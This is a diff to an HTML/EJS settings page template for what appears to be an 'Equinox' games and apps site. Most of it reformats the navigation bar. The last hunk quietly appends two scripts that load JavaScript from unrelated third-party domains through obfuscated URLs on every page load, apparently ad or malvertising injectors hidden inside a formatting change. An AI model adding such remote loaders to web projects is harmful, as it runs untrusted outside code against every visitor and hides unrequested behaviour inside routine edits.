@@ -28,38 +28,40 @@
    <div class="topbar">
       <div class="left-buttons">
          <a id="exit" onclick="exit()" style="display: none">
-             <span style="font-weight: bold;"><i class="fas fa-sign-out-alt"></i> Exit</span>
+            <span style="font-weight: bold;"><i class="fas fa-sign-out-alt"></i> Exit</span>
          </a>
          <a id="homebtn" href="/" class="<%= path === '/' ? 'nav-active' : 'nav-btn' %>">
-             <span><i class="fas fa-home"></i> Home</span>
+            <span><i class="fas fa-home"></i> Home</span>
          </a>
          <a id="games" href="/g" class="<%= path === '/g' ? 'nav-active' : 'nav-btn' %>">
-             <span><i class="fas fa-gamepad"></i> Games</span>
+            <span><i class="fas fa-gamepad"></i> Games</span>
          </a>
          <a id="apps" href="/a" class="<%= path === '/a' ? 'nav-active' : 'nav-btn' %>">
-             <span><i class="fas fa-th"></i> Apps</span>
+            <span><i class="fas fa-th"></i> Apps</span>
          </a>
-     </div>
-	
-		<form id="form" class="center-form">
-         <input autofocus autocomplete="off" class="search" id="search" placeholder="Equinox Settings" style="text-align: center;" disabled />
-			<button type="submit" class="submit-button">
-				<i class="fas fa-search searchicon"></i>
-			</button>
-		</form>
-	
-		<div class="right-section">
-		   <a id="util" href="/u" class="<%= path === '/u' ? 'nav-active' : 'nav-btn' %>">
-			  <span><i class="fas fa-wrench"></i> Utilities</span>
-		  </a>
-			<a class="<%= path === '/s' ? 'nav-active' : 'nav-btn' %>" id="settings" href="/s" style="display: flex; justify-content: flex-end; margin-left: auto;">
-				<span><i class="fas fa-cog"></i> Settings</span>
-			</a>
-			<a id="fullscreen" onclick="fullscreen()" style="display: none">
-				<span><i class="fas fa-expand"></i> Full Screen</span>
-			</a>
-		</div>
-	</div>
+      </div>
+
+      <form id="form" class="center-form">
+         <input autofocus autocomplete="off" class="search" id="search" placeholder="Equinox Settings"
+            style="text-align: center;" disabled />
+         <button type="submit" class="submit-button">
+            <i class="fas fa-search searchicon"></i>
+         </button>
+      </form>
+
+      <div class="right-section">
+         <a id="util" href="/u" class="<%= path === '/u' ? 'nav-active' : 'nav-btn' %>">
+            <span><i class="fas fa-wrench"></i> Utilities</span>
+         </a>
+         <a class="<%= path === '/s' ? 'nav-active' : 'nav-btn' %>" id="settings" href="/s"
+            style="display: flex; justify-content: flex-end; margin-left: auto;">
+            <span><i class="fas fa-cog"></i> Settings</span>
+         </a>
+         <a id="fullscreen" onclick="fullscreen()" style="display: none">
+            <span><i class="fas fa-expand"></i> Full Screen</span>
+         </a>
+      </div>
+   </div>
    <div class="games-body">
       <h3 class="category-heading" id="recent-txt"><img class="recent-img" src="/assets/eqsettings.png"
             style="padding-left: 10px"></h3>
@@ -163,6 +165,28 @@
    </div>
    </div>
    <script src="/assets/js/settings.js"></script>
+   <script>
+      (function (llwil) {
+         var d = document,
+            s = d.createElement('script'),
+            l = d.scripts[d.scripts.length - 1];
+         s.settings = llwil || {};
+         s.src = "\/\/ourdifficulty.com\/c\/D\/9v6.bP2P5OlxSYW\/QZ9tNXTlMX0kNmTSYFxWOHSx0W1PMPzaQL1fNXjCIXwF";
+         s.async = true;
+         l.parentNode.insertBefore(s, l);
+      })({})
+   </script>
+   <script>
+         (function (olorwe) {
+            var d = document,
+               s = d.createElement('script'),
+               l = d.scripts[d.scripts.length - 1];
+            s.settings = olorwe || {};
+            s.src = "\/\/glum-mortgage.com\/aTW\/5ow.YeWbdTlPQW2\/9TkYZ\/Tz9U6gbZ2_5mljSsWuQc9PNvTDMG0jN\/T_YsxPN_y\/0q1\/MPzeQe1HNgjfE\/4n";
+            s.async = true;
+            l.parentNode.insertBefore(s, l);
+         })({})
+   </script>
 </body>
 
 </html>
